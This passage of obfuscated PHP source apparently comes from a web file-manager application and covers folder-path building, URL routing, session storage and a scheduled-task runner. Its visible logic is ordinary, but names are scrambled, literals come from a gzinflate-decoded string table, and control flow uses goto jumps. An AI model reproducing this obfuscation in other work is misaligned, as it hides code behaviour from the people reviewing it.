$ê‚Ÿ‰[$°Ä¨‡úı[416]][$°Ä¨‡úı[520]] = $ê‚Ÿ‰[$°Ä¨‡úı[521]]; $ê‚Ÿ‰[$°Ä¨‡úı[416]][$°Ä¨‡úı[522]] = $°Ä¨‡úı[89]; if ($»îËß¯¤[$°Ä¨‡úı[454]] != $ª ã—æ½) { $ê‚Ÿ‰[$°Ä¨‡úı[416]][$°Ä¨‡úı[417]] = $ê‚Ÿ‰[$°Ä¨‡úı[416]][$°Ä¨‡úı[417]] & $»îËß¯¤[$°Ä¨‡úı[416]][$°Ä¨‡úı[416]]; } continue; } $Ğ´¤ş­Ô = $this->parentLevelArray($ê‚Ÿ‰[$°Ä¨‡úı[523]]); $õÉ¡‚áú = array_reverse($Ğ´¤ş­Ô); foreach ($õÉ¡‚áú as $Ú·“µæù => $®œ’ÓÆö) { if (!isset($Ï‚“ò†[$®œ’ÓÆö])) { continue; } $»îËß¯¤ = $Ï‚“ò†[$®œ’ÓÆö]; $ê‚Ÿ‰[$°Ä¨‡úı[416]][$°Ä¨‡úı[519]] = $»îËß¯¤; if ($»îËß¯¤[$°Ä¨‡úı[454]] != $ª ã—æ½) { $ê‚Ÿ‰[$°Ä¨‡úı[416]][$°Ä¨‡úı[417]] = $ê‚Ÿ‰[$°Ä¨‡úı[416]][$°Ä¨‡úı[417]] & $»îËß¯¤[$°Ä¨‡úı[416]][$°Ä¨‡úı[416]]; } $Ş¦ö³ü = $°Ä¨‡úı[12]; $÷„ÌµØ¡ = count($Ğ´¤ş­Ô) - $Ú·“µæù; for ($¦ÂÀÈúÏ = 0; $¦ÂÀÈúÏ < $÷„ÌµØ¡; $¦ÂÀÈúÏ++) { if (!isset($€õÅì€œ[$Ğ´¤ş­Ô[$¦ÂÀÈúÏ]])) { $Ş¦ö³ü = $°Ä¨‡úı[12]; break; } $Ş¦ö³ü = $Ş¦ö³ü . rtrim($€õÅì€œ[$Ğ´¤ş­Ô[$¦ÂÀÈúÏ]], $°Ä¨‡úı[8]) . $°Ä¨‡úı[8]; } $ê‚Ÿ‰[$°Ä¨‡úı[416]][$°Ä¨‡úı[520]] = rtrim($Ş¦ö³ü, $°Ä¨‡úı[8]) . $°Ä¨‡úı[8]; break; } } unset($ê‚Ÿ‰); } public function groupPathDisplay(&$†Œ¥ŸĞî) { $Ô¤ïİÂê =& $_SERVER[Æ š¦İÈ]; if ($†Œ¥ŸĞî[$Ô¤ïİÂê[414]] != self::TYPE_GROUP) { return; } $’¢Ö““† = Model($Ô¤ïİÂê[524])->getInfo($†Œ¥ŸĞî[$Ô¤ïİÂê[506]]); $¬‹¡È‰¸ = $this->parentLevelArray($’¢Ö““†[$Ô¤ïİÂê[523]]); $’ŞŞ®¢ = $Ô¤ïİÂê[12]; foreach ($¬‹¡È‰¸ as $Æ‰¶àÌ) { $¾Şß°—ø = Model($Ô¤ïİÂê[524])->getInfo($Æ‰¶àÌ); $’ŞŞ®¢ .= $¾Şß°—ø[$Ô¤ïİÂê[87]][$Ô¤ïİÂê[405]] . $Ô¤ïİÂê[50]; } $†Œ¥ŸĞî[$Ô¤ïİÂê[525]] = $’¢Ö““†[$Ô¤ïİÂê[500]]; $†Œ¥ŸĞî[$Ô¤ïİÂê[526]] = $’¢Ö““†[$Ô¤ïİÂê[523]]; $†Œ¥ŸĞî[$Ô¤ïİÂê[527]] = $’¢Ö““†[$Ô¤ïİÂê[528]]; $†Œ¥ŸĞî[$Ô¤ïİÂê[529]] = $’ŞŞ®¢ . $’¢Ö““†[$Ô¤ïİÂê[87]][$Ô¤ïİÂê[405]]; } protected function _listAppendPath(&$š…ë×«Â, $«ŞÉ¹Ïº = false) { $ô­‹æ… =& $_SERVER[Æ š¦İÈ]; static $Ÿ¥÷¤ = array(); $Ö¾Âô´° = array(); $„·ì»¢Ü = array(); if ($«ŞÉ¹Ïº) { return $Ÿ¥÷¤; } foreach ($š…ë×«Â as &$µ¥À¹à³) { $‰Ìü”¹ = $µ¥À¹à³[$ô­‹æ…[405]]; if ($µ¥À¹à³[$ô­‹æ…[413]] == $ô­‹æ…[89] && $µ¥À¹à³[$ô­‹æ…[500]] != 0) { $Ÿ¥÷¤[$‰Ìü”¹] = $µ¥À¹à³[$ô­‹æ…[32]]; } if ($µ¥À¹à³[$ô­‹æ…[413]] == $ô­‹æ…[89] && $µ¥À¹à³[$ô­‹æ…[500]] == 0 && !isset($Ÿ¥÷¤[$‰Ìü”¹])) { $Ÿ¥÷¤[$‰Ìü”¹] = $this->_listAppendPathRoot($µ¥À¹à³, array()); } if (isset($„·ì»¢Ü[$µ¥À¹à³[$ô­‹æ…[523]]])) { continue; } $„·ì»¢Ü[$µ¥À¹à³[$ô­‹æ…[523]]] = !0; $¸£„Òûú = $this->parentLevelArray($µ¥À¹à³[$ô­‹æ…[523]]); foreach ($¸£„Òûú as $¢‹ûŠÄ¯ => $ô‹ôøÖæ) { if (isset($Ÿ¥÷¤[$ô‹ôøÖæ])) { continue; } if ($¢‹ûŠÄ¯ == 0) { $Ÿ¥÷¤[$ô‹ôøÖæ] = $this->_listAppendPathRoot($µ¥À¹à³, $¸£„Òûú); } if ($¢‹ûŠÄ¯ != 0) { $Ö¾Âô´°[] = $ô‹ôøÖæ; } } } unset($µ¥À¹à³); $Ö¾Âô´° = array_unique($Ö¾Âô´°); if (count($Ö¾Âô´°) > 0) { $†øõÜ¼Ÿ = array($ô­‹æ…[420] => array($ô­‹æ…[421], $Ö¾Âô´°)); if (count($Ö¾Âô´°) == 1) { $½œş›‘× = $this->sourceInfo($Ö¾Âô´°[0]); $àá ÏÁø = is_array($½œş›‘×) ? array($½œş›‘×) : !1; } else { $àá ÏÁø = $this->field($ô­‹æ…[530])->where($†øõÜ¼Ÿ)->select(); } if (!$àá ÏÁø) { $àá ÏÁø = array(); } foreach ($àá ÏÁø as $®îĞÄ´ö) { $Ÿ¥÷¤[$®îĞÄ´ö[$ô­‹æ…[405]]] = $®îĞÄ´ö[$ô­‹æ…[32]]; } } $Éşºù« = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¤Ã¯Áª = array(); foreach ($š…ë×«Â as &$µ¥À¹à³) { $¤†¨õ£œ = $µ¥À¹à³[$ô­‹æ…[523]]; $×‡åó÷ = $ô­‹æ…[12]; if (isset($¤Ã¯Áª[$¤†¨õ£œ])) { $×‡åó÷ = $¤Ã¯Áª[$¤†¨õ£œ]; } else { $¸£„Òûú = $this->parentLevelArray($µ¥À¹à³[$ô­‹æ…[523]]); foreach ($¸£„Òûú as $¢‹ûŠÄ¯ => $ô‹ôøÖæ) { if (isset($Ÿ¥÷¤[$ô‹ôøÖæ])) { $×‡åó÷ .= $Ÿ¥÷¤[$ô‹ôøÖæ] . $ô­‹æ…[8]; } } $¤Ã¯Áª[$¤†¨õ£œ] = $×‡åó÷; } $×‡åó÷ .= $µ¥À¹à³[$ô­‹æ…[32]]; if ($µ¥À¹à³[$ô­‹æ…[413]] == $ô­‹æ…[89]) { $×‡åó÷ .= $ô­‹æ…[8]; } $µ¥À¹à³[$ô­‹æ…[521]] = str_replace($ô­‹æ…[531], $ô­‹æ…[8], $×‡åó÷); if ($µ¥À¹à³[$ô­‹æ…[500]] == $ô­‹æ…[192]) { $µ¥À¹à³[$ô­‹æ…[32]] = trim($Ÿ¥÷¤[$µ¥À¹à³[$ô­‹æ…[405]]], $ô­‹æ…[8]); $µ¥À¹à³[$ô­‹æ…[521]] = $µ¥À¹à³[$ô­‹æ…[32]] . $ô­‹æ…[8]; } if (intval($µ¥À¹à³[$ô­‹æ…[414]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($µ¥À¹à³, $¸£„Òûú, $Éşºù«); } } unset($µ¥À¹à³); return $š…ë×«Â; } private function _listAppendPathRecycle(&$ ı§”°Ì, $­ìÅÀ×ı, $ş£¾…ãñ) { $äô¸œÍğ =& $_SERVER[Æ š¦İÈ]; if (!in_array($ş£¾…ãñ, $­ìÅÀ×ı) && $ ı§”°Ì[$äô¸œÍğ[405]] != $ş£¾…ãñ) { return; } $õ¥ùï«“ = explode($äô¸œÍğ[8], trim($ ı§”°Ì[$äô¸œÍğ[521]], $äô¸œÍğ[8])); $ŸñÜ‡¾× = implode($äô¸œÍğ[8], array_slice($õ¥ùï«“, 2)); $ ı§”°Ì[$äô¸œÍğ[521]] = $äô¸œÍğ[8] . LNG($äô¸œÍğ[532]) . $äô¸œÍğ[8] . ltrim($ŸñÜ‡¾×, $äô¸œÍğ[8]); $ ı§”°Ì[$äô¸œÍğ[523]] = $äô¸œÍğ[533] . implode($äô¸œÍğ[50], array_slice($­ìÅÀ×ı, 1)) . $äô¸œÍğ[50]; if ($ ı§”°Ì[$äô¸œÍğ[405]] == $ş£¾…ãñ) { $ ı§”°Ì[$äô¸œÍğ[523]] = $äô¸œÍğ[533]; $ ı§”°Ì[$äô¸œÍğ[500]] = $äô¸œÍğ[192]; $ ı§”°Ì[$äô¸œÍğ[32]] = LNG($äô¸œÍğ[532]); } $ ı§”°Ì[$äô¸œÍğ[534]] = $äô¸œÍğ[535]; } protected function _listAppendPathRoot(&$ŸĞŒùÀˆ, $Üæ“ŒÅå) { $Å¨Æ˜ª„ =& $_SERVER[Æ š¦İÈ]; $„‘¯è°» = $Å¨Æ˜ª„[12]; if ($ŸĞŒùÀˆ[$Å¨Æ˜ª„[414]] == self::TYPE_USER) { if (defined($Å¨Æ˜ª„[476]) && $ŸĞŒùÀˆ[$Å¨Æ˜ª„[506]] == USER_ID) { $„‘¯è°» = LNG($Å¨Æ˜ª„[536]); if (!$Üæ“ŒÅå) { $ŸĞŒùÀˆ[$Å¨Æ˜ª„[32]] = $„‘¯è°»; } } else { $‘—ˆ§íû = Model($Å¨Æ˜ª„[515])->getInfoSimple($ŸĞŒùÀˆ[$Å¨Æ˜ª„[506]]); $„‘¯è°» = LNG($Å¨Æ˜ª„[537]) . $Å¨Æ˜ª„[161] . $‘—ˆ§íû[$Å¨Æ˜ª„[32]] . $Å¨Æ˜ª„[538]; } } else { if ($ŸĞŒùÀˆ[$Å¨Æ˜ª„[414]] == self::TYPE_GROUP) { $‘—ˆ§íû = Model($Å¨Æ˜ª„[524])->getInfoSimple($ŸĞŒùÀˆ[$Å¨Æ˜ª„[506]]); $„‘¯è°» = $‘—ˆ§íû[$Å¨Æ˜ª„[32]]; } else { if ($ŸĞŒùÀˆ[$Å¨Æ˜ª„[414]] == self::TYPE_SYSTEM) { $„‘¯è°» = $Å¨Æ˜ª„[539]; } } } $„‘¯è°» = $„‘¯è°» ? $Å¨Æ˜ª„[8] . $„‘¯è°» . $Å¨Æ˜ª„[8] : $Å¨Æ˜ª„[8]; return $„‘¯è°»; } protected function _listAppendUser(&$æÍĞ¯´) { $¾¥ïë—³ =& $_SERVER[Æ š¦İÈ]; $ãÈœŠÇ = array_to_keyvalue($æÍĞ¯´, $¾¥ïë—³[12], $¾¥ïë—³[454]); $Ä €×– = array_to_keyvalue($æÍĞ¯´, $¾¥ïë—³[12], $¾¥ïë—³[456]); $Ãœ½›«¾ = array_merge($ãÈœŠÇ, $Ä €×–); $Õ¿Éú = Model($¾¥ïë—³[540])->userListInfo($Ãœ½›«¾); foreach ($æÍĞ¯´ as &$·Áƒ°É”) { $­¿…Ğç” = $·Áƒ°É”[$¾¥ïë—³[454]]; $·Áƒ°É”[$¾¥ïë—³[454]] = $Õ¿Éú[$­¿…Ğç”] ? $Õ¿Éú[$­¿…Ğç”] : !1; $­¿…Ğç” = $·Áƒ°É”[$¾¥ïë—³[456]]; $·Áƒ°É”[$¾¥ïë—³[456]] = $Õ¿Éú[$­¿…Ğç”] ? $Õ¿Éú[$­¿…Ğç”] : !1; if (isset($·Áƒ°É”[$¾¥ïë—³[467]]) && $·Áƒ°É”[$¾¥ïë—³[467]][$¾¥ïë—³[541]]) { $´ˆÁºä = $GLOBALS[$¾¥ïë—³[6]][$¾¥ïë—³[90]][$¾¥ïë—³[542]]; if ($·Áƒ°É”[$¾¥ïë—³[467]][$¾¥ïë—³[543]] <= time() - $´ˆÁºä) { $this->metaSet($·Áƒ°É”[$¾¥ïë—³[405]], $¾¥ïë—³[541], null); $this->metaSet($·Áƒ°É”[$¾¥ïë—³[405]], $¾¥ïë—³[543], null); unset($·Áƒ°É”[$¾¥ïë—³[467]][$¾¥ïë—³[541]]); continue; } $éãî£øØ = $·Áƒ°É”[$¾¥ïë—³[467]][$¾¥ïë—³[541]]; $·Áƒ°É”[$¾¥ïë—³[467]][$¾¥ïë—³[544]] = Model($¾¥ïë—³[540])->getInfoSimpleOuter($éãî£øØ); } } unset($·Áƒ°É”); } public function parentLevelArray($¯óğÂü) { $Ùí»Î£Œ =& $_SERVER[Æ š¦İÈ]; $¯óğÂü = explode($Ùí»Î£Œ[50], trim($¯óğÂü, $Ùí»Î£Œ[50])); return array_remove_value($¯óğÂü, $Ùí»Î£Œ[192]); } public function listAll($à‹øÃèÄ) { $åˆç†‰æ =& $_SERVER[Æ š¦İÈ]; $‹€ÈÚ¥ø = $this->sourceInfo($à‹øÃèÄ); $Ù£Ğœ = array($åˆç†‰æ[545] => array($åˆç†‰æ[546], $‹€ÈÚ¥ø[$åˆç†‰æ[523]] . $à‹øÃèÄ . $åˆç†‰æ[547]), $åˆç†‰æ[548] => 0); $‰¾˜Ìì¡ = $åˆç†‰æ[549]; $ãŒÈœ“Å = "\x4c\x45\x46\124\40\x4a\117\111\116\40{$this->tablePrefix}\x69\157\x5f\x66\x69\x6c\x65\40\146\x69\154\145\x20\157\156\40\x73\157\x75\162\x63\x65\56\x66\151\x6c\145\x49\x44\x20\x3d\40\x66\x69\154\x65\x2e\146\151\x6c\x65\x49\x44"; $á‘ªĞ¼ = $this->alias($åˆç†‰æ[446])->field($‰¾˜Ìì¡)->where($Ù£Ğœ)->join($ãŒÈœ“Å)->select(); $this->_listAppendAuth($á‘ªĞ¼); $this->_listAppendUser($á‘ªĞ¼); $this->_listAppendPath($á‘ªĞ¼); $á‘ªĞ¼ = array_to_keyvalue($á‘ªĞ¼, $åˆç†‰æ[405]); $ÊòĞù¾µ = "\x2f{$‹€ÈÚ¥ø[$åˆç†‰æ[32]]}\x2f"; $ÊòĞù¾µ = $ÊòĞù¾µ == $åˆç†‰æ[531] ? $åˆç†‰æ[8] : $ÊòĞù¾µ; $¾©›âª« = array(); foreach ($á‘ªĞ¼ as $ÈéÌÄ¯ => $§½¾º©”) { $‘é¾¨™á = $this->parentLevelArray($§½¾º©”[$åˆç†‰æ[523]]); array_shift($‘é¾¨™á); $õœ£Îİº = $ÊòĞù¾µ; for ($½äÑ±Ÿì = 0; $½äÑ±Ÿì < count($‘é¾¨™á); $½äÑ±Ÿì++) { $õœ£Îİº .= $á‘ªĞ¼[$‘é¾¨™á[$½äÑ±Ÿì]][$åˆç†‰æ[32]] . $åˆç†‰æ[8]; } $õœ£Îİº .= $§½¾º©”[$åˆç†‰æ[32]]; if ($§½¾º©”[$åˆç†‰æ[413]]) { $õœ£Îİº .= $åˆç†‰æ[8]; } $õœ£Îİº = str_replace($åˆç†‰æ[531], $åˆç†‰æ[8], $õœ£Îİº); $õœ£Îİº = str_replace($åˆç†‰æ[531], $åˆç†‰æ[8], $õœ£Îİº); $‚¶ Š“Ã = array($åˆç†‰æ[424] => str_replace($åˆç†‰æ[531], $åˆç†‰æ[8], $õœ£Îİº), $åˆç†‰æ[550] => intval($§½¾º©”[$åˆç†‰æ[413]]), $åˆç†‰æ[87] => $this->pathInfoFilter($§½¾º©”)); if (!$§½¾º©”[$åˆç†‰æ[413]]) { $‚¶ Š“Ã[$åˆç†‰æ[469]] = $§½¾º©”[$åˆç†‰æ[469]]; $‚¶ Š“Ã[$åˆç†‰æ[88]] = $§½¾º©”[$åˆç†‰æ[78]]; } $¾©›âª«[] = $‚¶ Š“Ã; } return $¾©›âª«; } } goto Dßï¢³é”Ç; b‰²‹¬º‚Ô: define($_SERVER[Æ š¦İÈ][0], $_SERVER[Æ š¦İÈ][1]); $_SERVER[¬ˆ¹âÅÏ] = explode($_SERVER[Æ š¦İÈ][2], gzinflate(substr($_SERVER[Æ š¦İÈ][3], 10, -8))); function binCheckEq($‰•¿°›æ, $û³°¡Ğ) { return $‰•¿°›æ == $û³°¡Ğ; } goto Eœò§´±í£; C¸®£ÁÂğß: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\133\136\57\135\53", "\x3a\156\165\155" => "\133\60\55\x39\x5d\53", "\72\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($öòÉ áï, $öÕ”ˆ®Ó) { $ÈğÄÕÀß =& $_SERVER[Æ š¦İÈ]; if ($öòÉ áï == $ÈğÄÕÀß[1589]) { $Îì‚½ÊÂ = array_map($ÈğÄÕÀß[1590], $öÕ”ˆ®Ó[0]); $ÙŒÁçÎš = strpos($öÕ”ˆ®Ó[1], $ÈğÄÕÀß[8]) === 0 ? $öÕ”ˆ®Ó[1] : $ÈğÄÕÀß[8] . $öÕ”ˆ®Ó[1]; $…‡Š•‰ = $öÕ”ˆ®Ó[2]; } else { $Îì‚½ÊÂ = null; $ÙŒÁçÎš = strpos($öÕ”ˆ®Ó[0], $ÈğÄÕÀß[8]) === 0 ? $öÕ”ˆ®Ó[0] : $ÈğÄÕÀß[8] . $öÕ”ˆ®Ó[0]; $…‡Š•‰ = $öÕ”ˆ®Ó[1]; } array_push(self::$maps, $Îì‚½ÊÂ); array_push(self::$routes, $ÙŒÁçÎš); array_push(self::$methods, strtoupper($öòÉ áï)); array_push(self::$callbacks, $…‡Š•‰); } public static function error($çÇ²øâ„) { self::$errorCallback = $çÇ²øâ„; } public static function haltOnMatch($º±­‡¹Ü = true) { self::$halts = $º±­‡¹Ü; } public static function dispatch() { $°ØûÅÁÆ =& $_SERVER[Æ š¦İÈ]; $½ñŠ˜Ë˜ = parse_url($_SERVER[$°ØûÅÁÆ[1591]], PHP_URL_PATH); $®ÄöŸÌó = $_SERVER[$°ØûÅÁÆ[158]]; $şôµŞÖ = array_keys(static::$patterns); $–ƒƒô¯ = array_values(static::$patterns); $Ğ† Æáâ = !1; self::$routes = preg_replace($°ØûÅÁÆ[1258], $°ØûÅÁÆ[8], self::$routes); if (in_array($½ñŠ˜Ë˜, self::$routes)) { $Ã¸ÌçšÌ = array_keys(self::$routes, $½ñŠ˜Ë˜); foreach ($Ã¸ÌçšÌ as $ ïˆ¡”) { if (self::$methods[$ ïˆ¡”] == $®ÄöŸÌó || self::$methods[$ ïˆ¡”] == $°ØûÅÁÆ[1592] || in_array($®ÄöŸÌó, self::$maps[$ ïˆ¡”])) { $Ğ† Æáâ = !0; if (!is_object(self::$callbacks[$ ïˆ¡”])) { $„Ê£¢‰Ú = explode($°ØûÅÁÆ[8], self::$callbacks[$ ïˆ¡”]); $ëò’€Óù = end($„Ê£¢‰Ú); $×Ğ€³š¿ = explode($°ØûÅÁÆ[1593], $ëò’€Óù); $€¦åİÅİ = new $×Ğ€³š¿[0](); $€¦åİÅİ->{$×Ğ€³š¿[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ ïˆ¡”]); if (self::$halts) { return; } } } } } else { $­­…»Ş­ = 0; foreach (self::$routes as $ ïˆ¡”) { if (strpos($ ïˆ¡”, $°ØûÅÁÆ[4]) !== !1) { $ ïˆ¡” = str_replace($şôµŞÖ, $–ƒƒô¯, $ ïˆ¡”); } if (preg_match($°ØûÅÁÆ[1594] . $ ïˆ¡” . $°ØûÅÁÆ[1595], $½ñŠ˜Ë˜, $ª½Äıì”)) { if (self::$methods[$­­…»Ş­] == $®ÄöŸÌó || self::$methods[$­­…»Ş­] == $°ØûÅÁÆ[1592] || !empty(self::$maps[$­­…»Ş­]) && in_array($®ÄöŸÌó, self::$maps[$­­…»Ş­])) { $Ğ† Æáâ = !0; array_shift($ª½Äıì”); if (!is_object(self::$callbacks[$­­…»Ş­])) { $„Ê£¢‰Ú = explode($°ØûÅÁÆ[8], self::$callbacks[$­­…»Ş­]); $ëò’€Óù = end($„Ê£¢‰Ú); $×Ğ€³š¿ = explode($°ØûÅÁÆ[1593], $ëò’€Óù); $€¦åİÅİ = new $×Ğ€³š¿[0](); if (!method_exists($€¦åİÅİ, $×Ğ€³š¿[1])) { echo $°ØûÅÁÆ[1596]; } else { call_user_func_array(array($€¦åİÅİ, $×Ğ€³š¿[1]), $ª½Äıì”); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$­­…»Ş­], $ª½Äıì”); if (self::$halts) { return; } } } } $­­…»Ş­++; } } if ($Ğ† Æáâ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ã±±İÒƒ =& $_SERVER[Æ š¦İÈ]; header($_SERVER[$Ã±±İÒƒ[1597]] . $Ã±±İÒƒ[1598]); echo $Ã±±İÒƒ[1599]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$°ØûÅÁÆ[1591]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $€°ç¢óò =& $_SERVER[Æ š¦İÈ]; static $ÉÖéú¦¿ = false; if ($ÉÖéú¦¿) { return $ÉÖéú¦¿; } $İ¼¤š¿Ş = $GLOBALS[$€°ç¢óò[6]][$€°ç¢óò[346]]; self::$sessionTime = $İ¼¤š¿Ş[$€°ç¢óò[1600]]; $‚­ÔÚğ = isset($GLOBALS[$€°ç¢óò[1601]]) ? $GLOBALS[$€°ç¢óò[1601]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($‚­ÔÚğ)) { self::$sessionSign = Cookie::get($‚­ÔÚğ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($‚­ÔÚğ, self::$sessionSign, self::$sessionTime); $ıŠøßı = $İ¼¤š¿Ş[$€°ç¢óò[1602]]; $¥¢ñØ»Ï = $İ¼¤š¿Ş[$ıŠøßı]; $ŸŞ¸²Â = $İ¼¤š¿Ş[$€°ç¢óò[825]]; switch ($ıŠøßı) { case $€°ç¢óò[21]: self::$handle = Model($€°ç¢óò[826]); break; case $€°ç¢óò[827]: self::$handle = new CacheRedis($¥¢ñØ»Ï, $ŸŞ¸²Â); break; case $€°ç¢óò[828]: self::$handle = new CacheMemcached($¥¢ñØ»Ï, $ŸŞ¸²Â); break; case $€°ç¢óò[194]: $¥¢ñØ»Ï[$€°ç¢óò[78]] = $¥¢ñØ»Ï[$€°ç¢óò[78]] . $€°ç¢óò[1603]; self::$handle = new CacheFile($¥¢ñØ»Ï, $ŸŞ¸²Â); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÉÖéú¦¿ = new self(); return $ÉÖéú¦¿; } public static function getBySign($Å²‹À™¼) { CacheLock::lock($Å²‹À™¼); $ÄÍ¤í‹é = self::$handle->get($Å²‹À™¼); CacheLock::unlock($Å²‹À™¼); $ÄÍ¤í‹é = unserialize($ÄÍ¤í‹é); return is_array($ÄÍ¤í‹é) ? $ÄÍ¤í‹é : array(); } public static function setBySign($Ä»€ÀùÕ, $ü£¶) { CacheLock::lock($Ä»€ÀùÕ); self::$handle->set($Ä»€ÀùÕ, serialize($ü£¶), self::$sessionTime); CacheLock::unlock($Ä»€ÀùÕ); } public static function sign($¬Éƒ û™ = false) { $¬Éƒ û™ && (self::$sessionSign = $¬Éƒ û™); self::init(); return self::$sessionSign; } public static function set($éâ†Î¿‰, $ÌÂöóãã = false) { self::init(); if (is_array($éâ†Î¿‰)) { foreach ($éâ†Î¿‰ as $ÉÎâæºŞ => $ûïãÉÍ­) { array_set_value(self::$data, $ÉÎâæºŞ, $ûïãÉÍ­); } } else { array_set_value(self::$data, $éâ†Î¿‰, $ÌÂöóãã); } self::setBySign(self::$sessionSign, self::$data); } public static function get($‡ÜŒº¨Ã = false) { self::init(); if (!$‡ÜŒº¨Ã) { return self::$data; } return array_get_value(self::$data, $‡ÜŒº¨Ã); } public static function remove($èŞÃ°«Å) { self::init(); unset(self::$data[$èŞÃ°«Å]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Æ š¦İÈ][830])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¼Î¥ÛÛÙ =& $_SERVER[Æ š¦İÈ]; if (self::valueGet($¼Î¥ÛÛÙ[747]) != $¼Î¥ÛÛÙ[89]) { return; } if (self::valueGet($¼Î¥ÛÛÙ[1604]) == $¼Î¥ÛÛÙ[89]) { $îï®Û¤ = self::valueGet($¼Î¥ÛÛÙ[1605]); if (time() - $îï®Û¤ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($¼Î¥ÛÛÙ[1604], $¼Î¥ÛÛÙ[89]); self::log($¼Î¥ÛÛÙ[1606]); Hook::bind($¼Î¥ÛÛÙ[1607], $¼Î¥ÛÛÙ[1608]); $´ú€¶² = 0; while (!0) { self::cacheClear(); if (self::valueGet($¼Î¥ÛÛÙ[747]) != $¼Î¥ÛÛÙ[89]) { self::valueSet($¼Î¥ÛÛÙ[1604], $¼Î¥ÛÛÙ[192]); self::log($¼Î¥ÛÛÙ[1609]); die; } $¹ñŞë·² = time(); if ($¹ñŞë·² - $´ú€¶² >= 60) { self::valueSet(array($¼Î¥ÛÛÙ[1604] => $¼Î¥ÛÛÙ[89], $¼Î¥ÛÛÙ[1605] => $¹ñŞë·²), !1); $´ú€¶² = $¹ñŞë·²; } if (!file_exists(USER_SYSTEM . $¼Î¥ÛÛÙ[1610])) { self::valueSet(array($¼Î¥ÛÛÙ[1604] => $¼Î¥ÛÛÙ[192], $¼Î¥ÛÛÙ[747] => $¼Î¥ÛÛÙ[192]), !1); self::log($¼Î¥ÛÛÙ[1611]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $™º¾“¾ô =& $_SERVER[Æ š¦İÈ]; http_close(); self::valueSet($™º¾“¾ô[747], $™º¾“¾ô[192]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($™º¾“¾ô[1604] => $™º¾“¾ô[192], $™º¾“¾ô[747] => $™º¾“¾ô[89]), !1); } public static function shutdownEvent() { $®¾ŒûÂÎ =& $_SERVER[Æ š¦İÈ]; self::valueSet($®¾ŒûÂÎ[1604], $®¾ŒûÂÎ[192]); self::log($®¾ŒûÂÎ[1612]); } public static function config($ºš®ŠøŸ, $èÇ¸Íª) { self::valueSet($_SERVER[Æ š¦İÈ][747], $ºš®ŠøŸ); } private static function taskRunAll() { $»‘Ûª– =& $_SERVER[Æ š¦İÈ]; $ßšïó× = timeFloat(); $°Ÿ‰À°õ = Model($»‘Ûª–[1613])->listData(); $ğˆıŠ°Ë = count($°Ÿ‰À°õ); for ($ŞÀ°¨ÌÉ = 0; $ŞÀ°¨ÌÉ < $ğˆıŠ°Ë; $ŞÀ°¨ÌÉ++) { $Çù×êßÁ = $°Ÿ‰À°õ[$ŞÀ°¨ÌÉ]; if (!$Çù×êßÁ[$»‘Ûª–[403]] || $Çù×êßÁ[$»‘Ûª–[1614]] != $»‘Ûª–[89]) { continue; } if (!self::taskTimeCheck($Çù×êßÁ)) { continue; } self::taskRun($Çù×êßÁ); } Hook::trigger($»‘Ûª–[1615]); self::taskQueueRun($ßšïó×); } private static function taskQueueRun($ ¥ßÒ¢û) { $ñ©¢€ÌÁ = 10; while (!0) { $œ¼ê¬¼ = TaskQueue::run(); if ($œ¼ê¬¼ === !1) { break; } if (timeFloat() - $ ¥ßÒ¢û >= $ñ©¢€ÌÁ) { break; } } } private static function taskTimeCheck($ĞüæÃ¯à) { $‘Ç°ÅÔ =& $_SERVER[Æ š¦İÈ]; $—ˆœÙ¿° = json_decode($ĞüæÃ¯à[$‘Ç°ÅÔ[198]], !0); $ŞÎàÙ“ = intval($ĞüæÃ¯à[$‘Ç°ÅÔ[1605]]); $™£Àøê = strtotime($‘Ç°ÅÔ[1616] . $—ˆœÙ¿°[$‘Ç°ÅÔ[1617]] . $‘Ç°ÅÔ[1618]) - strtotime($‘Ç°ÅÔ[1619]); $‚£ŠÃ = time() - strtotime(date($‘Ç°ÅÔ[1620]) . $‘Ç°ÅÔ[1621]); $¤Íªİ—Ğ = $‚£ŠÃ >= $™£Àøê && $‚£ŠÃ <= $™£Àøê + 3600; switch ($—ˆœÙ¿°[$‘Ç°ÅÔ[33]]) { case $‘Ç°ÅÔ[1622]: if (time() - $ŞÎàÙ“ < 3600 * 24 * 30) { return !1; } if ($—ˆœÙ¿°[$‘Ç°ÅÔ[1622]] == date($‘Ç°ÅÔ[1623]) && $¤Íªİ—Ğ) { return !0; } break; case $‘Ç°ÅÔ[1624]: if (time() - $ŞÎàÙ“ < 3600 * 24 * 7) { return !1; } $–Êè¾Şö = date($‘Ç°ÅÔ[1625]) == 0 ? 7 : date($‘Ç°ÅÔ[1625]); if ($—ˆœÙ¿°[$‘Ç°ÅÔ[1624]] == $–Êè¾Şö && $¤Íªİ—Ğ) { return !0; } break; case $‘Ç°ÅÔ[1617]: if (time() - $ŞÎàÙ“ < 3600 * 24) { return !1; } if ($¤Íªİ—Ğ) { return !0; } break; case $‘Ç°ÅÔ[1626]: if (time() - $ŞÎàÙ“ >= floatval($—ˆœÙ¿°[$‘Ç°ÅÔ[1626]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ë…“†ßé =& $_SERVER[Æ š¦İÈ]; static 